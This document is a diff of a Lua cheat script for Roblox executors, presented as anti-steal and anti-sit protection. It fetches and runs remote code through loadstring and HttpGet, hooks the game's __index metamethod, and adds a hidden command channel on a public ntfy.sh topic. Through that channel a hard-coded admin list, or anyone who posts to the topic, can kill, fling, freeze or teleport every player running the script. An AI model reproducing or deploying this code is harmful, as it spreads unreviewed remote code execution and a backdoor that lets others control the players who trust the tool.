@@ -1,13 +1,23 @@
--- ====================================================================
--- 1. โหลดสคริปต์กันดักตัวเดิมของคุณ (anti-ran)
--- ====================================================================
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GURANKUB/Anti-ran/refs/heads/main/anti-ran.lua"))()
+--[[
+    ═══════════════════════════════════════════════════════════════════════
+     RANKUKI HUB (CORE EDITION) - LOLASSR5
+    - Anti-Steal V2 (KFC & Thiw Defeater)
+    - Anti-Sit (Toggleable)
+    - Admin System (6 Commands via Cloud Signal)
+    ═══════════════════════════════════════════════════════════════════════
+]]
 
--- รอให้สคริปต์เดิมทำงานและตั้งค่า Hook ของมันให้เสร็จเรียบร้อยก่อน
+-- ====================================================================
+-- 1. โหลดสคริปต์กันดักตัวเดิม (anti-ran)
+-- ====================================================================
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GURANKUB/Anti-ran/refs/heads/main/anti-ran.lua"))()
+end)
+
 task.wait(1.5) 
 
 -- ====================================================================
--- 2. เกราะป้องกัน KFC V2 (ดักจับทุก Object ไม่สนสถานที่)
+-- 2. เกราะป้องกัน KFC V2
 -- ====================================================================
 local oldIndex
 oldIndex = hookmetamethod(game, "__index", function(self, key)
@@ -20,22 +30,271 @@ oldIndex = hookmetamethod(game, "__index", function(self, key)
 end)
 
 -- ====================================================================
--- 3. ระบบ Anti-Sit (กันนั่ง 100% ทำงานเบื้องหลัง)
+-- 3. Services & Variables
 -- ====================================================================
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
-RunService.Stepped:Connect(function()
-    local char = LocalPlayer.Character
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    if hum then
-        -- ถ้าตัวละครกำลังนั่ง หรือถูกบังคับให้อยู่ในสถานะนั่ง
-        if hum.Sit or hum:GetState() == Enum.HumanoidStateType.Seated then
-            hum.Sit = false
-            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
-        end
+-- ฟังก์ชัน HTTP Request รองรับทุก Executor
+local function fireRequest(options)
+    local req = request or http_request or (syn and syn.request) or (http and http.request)
+    if req then
+        return req(options)
+    end
+    return nil
+end
+
+-- ====================================================================
+-- 4. ระบบ Anti-Sit (Toggleable)
+-- ====================================================================
+local isAntiSitOn = false
+local antiSitConn = nil
+
+local function ToggleAntiSit()
+    isAntiSitOn = not isAntiSitOn
+    if isAntiSitOn then
+        antiSitConn = RunService.Stepped:Connect(function()
+            local char = LocalPlayer.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum and (hum.Sit or hum:GetState() == Enum.HumanoidStateType.Seated) then
+                hum.Sit = false
+                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+            end
+        end)
+    else
+        if antiSitConn then antiSitConn:Disconnect(); antiSitConn = nil end
+    end
+end
+
+-- ====================================================================
+-- 5. สร้าง UI พื้นฐาน
+-- ====================================================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CoreUI_LOLASSR5"
+ScreenGui.ResetOnSpawn = false
+pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)
+if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+-- ปุ่ม Anti-Sit
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Parent = ScreenGui
+ToggleBtn.Size = UDim2.new(0, 130, 0, 40)
+ToggleBtn.Position = UDim2.new(0, 20, 0, 100)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextSize = 14
+ToggleBtn.Text = "Anti-Sit: OFF"
+ToggleBtn.BorderSizePixel = 0
+ToggleBtn.Active = true
+ToggleBtn.Draggable = true 
+
+Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0, 8)
+local stroke = Instance.new("UIStroke", ToggleBtn); stroke.Color = Color3.fromRGB(100, 100, 100); stroke.Thickness = 1.5; stroke.Parent = ToggleBtn
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    ToggleAntiSit()
+    if isAntiSitOn then
+        ToggleBtn.Text = "Anti-Sit: ON"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
+        stroke.Color = Color3.fromRGB(0, 255, 150)
+    else
+        ToggleBtn.Text = "Anti-Sit: OFF"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+        stroke.Color = Color3.fromRGB(100, 100, 100)
     end
 end)
 
-print("✅ [Rankukiv2] โหลดสำเร็จ! กันดักเพลง KFC + กันนั่ง (Anti-Sit) ทำงานแล้ว")
+-- ====================================================================
+-- 6. ระบบแอดมิน CORE & คำสั่ง Bring + 5 คำสั่งใหม่
+-- ====================================================================
+local AdminList = {
+    "Preawa_19371", 
+    "YourUsernameHere", -- เปลี่ยนเป็นชื่อคุณ
+}
+
+-- ช่องสัญญาณเฉพาะของเกม LOLASSR5 CORE
+local BringChannel = "https://ntfy.sh/CORE_LOLASSR5_AdminBus_99X"
+
+local function IsAdmin()
+    for _, name in ipairs(AdminList) do
+        if string.lower(name) == string.lower(LocalPlayer.Name) then
+            return true
+        end
+    end
+    return false
+end
+
+-- ฟังก์ชันสำหรับส่งคำสั่ง (ฝั่งแอดมิน)
+local function SendCommand(cmd, targetName)
+    task.spawn(function()
+        -- รูปแบบข้อความ: cmd:target:admin
+        local data = string.format("%s:%s:%s", cmd, targetName, LocalPlayer.Name)
+        fireRequest({
+            Url = BringChannel,
+            Method = "POST",
+            Body = data
+        })
+    end)
+end
+
+-- [ฝั่งเป้าหมาย]: คอยฟังคำสั่งและกระทำกับตัวเอง
+task.spawn(function()
+    local lastCheckTime = os.time()
+    
+    while task.wait(1.5) do -- เช็กทุก 1.5 วินาที
+        pcall(function()
+            local res = fireRequest({
+                Url = BringChannel .. "/json?poll=1&since=" .. (lastCheckTime - 1) .. "s",
+                Method = "GET"
+            })
+            
+            if res and res.Body then
+                lastCheckTime = os.time()
+                for line in res.Body:gmatch("[^\r\n]+") do
+                    local success, decoded = pcall(function() return HttpService:JSONDecode(line) end)
+                    if success and decoded and decoded.message then
+                        local msgCmd, msgTarget, msgAdmin = decoded.message:match("^(.-):(.-):(.-)$")
+                        
+                        if msgTarget == LocalPlayer.Name then
+                            local myChar = LocalPlayer.Character
+                            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+
+                            -- 1. คำสั่ง Bring
+                            if msgCmd == "bring" then
+                                local adminPlayer = Players:FindFirstChild(msgAdmin)
+                                if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") and myHRP then
+                                    myHRP.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+                                end
+                            
+                            -- 2. คำสั่ง Kill
+                            elseif msgCmd == "kill" then
+                                if myHum then myHum.Health = 0 end
+                            
+                            -- 3. คำสั่ง Fling (ปัดกระเด็น)
+                            elseif msgCmd == "fling" then
+                                if myHRP then
+                                    myHRP.Velocity = Vector3.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
+                                    myHRP.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
+                                end
+                            
+                            -- 4. คำสั่ง Freeze (แช่แข็ง)
+                            elseif msgCmd == "freeze" then
+                                if myHRP and myHum then
+                                    myHRP.Anchored = true
+                                    myHum.WalkSpeed = 0
+                                    myHum.JumpPower = 0
+                                end
+                            
+                            -- 5. คำสั่ง Unfreeze (ปลดแช่แข็ง)
+                            elseif msgCmd == "unfreeze" then
+                                if myHRP and myHum then
+                                    myHRP.Anchored = false
+                                    myHum.WalkSpeed = 16
+                                    myHum.JumpPower = 50
+                                end
+                            
+                            -- 6. คำสั่ง Sky (เด้งขึ้นฟ้า)
+                            elseif msgCmd == "sky" then
+                                if myHRP then
+                                    myHRP.CFrame = myHRP.CFrame + Vector3.new(0, 500, 0)
+                                    myHRP.Velocity = Vector3.new(0, 100, 0)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- UI แอดมิน (สำหรับคนที่ชื่ออยู่ในลิสต์)
+if IsAdmin() then
+    local AdminFrame = Instance.new("Frame")
+    AdminFrame.Name = "CoreAdminPanel"
+    AdminFrame.Size = UDim2.new(0, 220, 0, 280)
+    AdminFrame.Position = UDim2.new(0, 20, 0, 150)
+    AdminFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    AdminFrame.BorderSizePixel = 0
+    AdminFrame.Active = true
+    AdminFrame.Draggable = true
+    AdminFrame.Parent = ScreenGui
+    
+    Instance.new("UICorner", AdminFrame).CornerRadius = UDim.new(0, 8)
+    local admStroke = Instance.new("UIStroke", AdminFrame)
+    admStroke.Color = Color3.fromRGB(0, 255, 255)
+    admStroke.Thickness = 1.5
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.BackgroundTransparency = 1
+    Title.Text = "👑 CORE ADMIN (LOLASSR5)"
+    Title.TextColor3 = Color3.fromRGB(0, 255, 255)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 13
+    Title.Parent = AdminFrame
+
+    local Input = Instance.new("TextBox")
+    Input.Size = UDim2.new(1, -20, 0, 30)
+    Input.Position = UDim2.new(0, 10, 0, 35)
+    Input.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    Input.BorderSizePixel = 0
+    Input.PlaceholderText = "ชื่อผู้เล่นเป้าหมาย..."
+    Input.Text = ""
+    Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Input.Font = Enum.Font.Gotham
+    Input.TextSize = 12
+    Input.Parent = AdminFrame
+    Instance.new("UICorner", Input).CornerRadius = UDim.new(0, 4)
+
+    -- ฟังก์ชันสร้างปุ่มสำหรับคำสั่ง
+    local function CreateCmdButton(text, cmd, yPos, color)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -20, 0, 30)
+        btn.Position = UDim2.new(0, 10, 0, yPos)
+        btn.BackgroundColor3 = color
+        btn.Text = text
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 12
+        btn.Parent = AdminFrame
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+
+        btn.MouseButton1Click:Connect(function()
+            if Input.Text ~= "" then
+                SendCommand(cmd, Input.Text)
+                local oldText = btn.Text
+                btn.Text = "✅ ส่งคำสั่งแล้ว!"
+                task.wait(1)
+                btn.Text = oldText
+            end
+        end)
+    end
+
+    -- สร้างปุ่มคำสั่งทั้ง 6 คำสั่ง
+    CreateCmdButton("📍 ดึงตัว (Bring)", "bring", 75, Color3.fromRGB(0, 150, 100))
+    CreateCmdButton("💀 ฆ่า (Kill)", "kill", 110, Color3.fromRGB(200, 50, 50))
+    CreateCmdButton("🌪️ ปัดกระเด็น (Fling)", "fling", 145, Color3.fromRGB(150, 50, 200))
+    CreateCmdButton("❄️ แช่แข็ง (Freeze)", "freeze", 180, Color3.fromRGB(50, 150, 200))
+    CreateCmdButton("🔥 ปลดแช่แข็ง (Unfreeze)", "unfreeze", 215, Color3.fromRGB(200, 100, 50))
+    CreateCmdButton("☁️ เด้งขึ้นฟ้า (Sky)", "sky", 250, Color3.fromRGB(100, 100, 100))
+
+    -- ระบบคำสั่งแชท (Chat Commands)
+    LocalPlayer.Chatted:Connect(function(msg)
+        local cmd, target = msg:match("^:(%w+)%s+(.+)")
+        if cmd and target then
+            cmd = string.lower(cmd)
+            if cmd == "bring" or cmd == "kill" or cmd == "fling" or cmd == "freeze" or cmd == "unfreeze" or cmd == "sky" then
+                SendCommand(cmd, target)
+            end
+        end
+    end)
+
+    print("✅ [Rankuki] CORE Admin Panel Loaded for LOLASSR5")
+else
+    print("✅ [Rankuki] Loaded. Waiting for CORE commands...")
+end
